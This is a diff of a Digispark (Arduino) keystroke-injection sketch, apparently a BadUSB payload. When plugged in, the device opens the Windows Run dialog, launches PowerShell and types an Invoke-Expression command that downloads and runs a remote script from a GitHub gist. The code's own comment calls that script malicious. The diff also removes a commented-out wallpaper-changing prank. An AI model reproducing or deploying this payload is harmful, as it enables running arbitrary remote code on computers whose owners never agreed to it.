@@ -1,34 +1,16 @@
-#include "DigiKeyboard.h"
-#include <avr/pgmspace.h>
+#include "DigiKeyboard.h" /* Digistump drives. */
+#include <avr/pgmspace.h> /* Fix memory issues. */
 
 void setup() {
   DigiKeyboard.update();
-  //empty
 }
+
 void loop() {
-  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // meta+r
-  delay(50);
-  DigiKeyboard.println(F("powershell"));
-  delay(400);
-  DigiKeyboard.print(F("Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/whoismath/a965e49313498b3ab4ef5a020ab573e7/raw/0ff6eda7549cffe074773840ea0bb3d8ab64fee8/change.ps1')"));  
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
-  DigiKeyboard.delay(200);
-  /*DigiKeyboard.print(F("$client = New-Object System.Net.WebClient"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.print(F("$client.DownloadFile(\"http://www.indiewire.com/wp-content/uploads/2017/07/rick-and-morty.png\" , \"rick-and-morty.png\")"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.print(F("Set-ItemProperty -path \'HKCU:\\Control Panel\\Desktop\' -name wallpaper -value \"%USERPROFILE%\\rick-and-morty.png\""));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.print(F("Set-ItemProperty -path \'HKCU:\\Software\\Microsoft\\Internet Explorer\\Desktop\\General\' -name wallpaper -value \"%USERPROFILE%\\rick-and-morty.png\""));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.print(F("rundll32.exe user32.dll, UpdatePerUserSystemParameters"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
-  DigiKeyboard.delay(200);
-  DigiKeyboard.print(F("exit"));
-  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);*/
-  for(;;){ /*empty*/ }
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); /* Open execute dialog. */
+  delay(50); /* Delay until it opens. */
+  DigiKeyboard.println(F("powershell")); /* Open powershell. */
+  delay(400); /* You may have to adjust this delay. */
+  DigiKeyboard.print(F("Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://gist.githubusercontent.com/whoismath/a965e49313498b3ab4ef5a020ab573e7/raw/ed8dbca8c0a9fcd976e5f51f03957add427f68f0/change.ps1')"));  /* Download and execute malicius script. */
+  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0); /* Send the command. */
+  for(;;) { /* run just once. */ }
 }
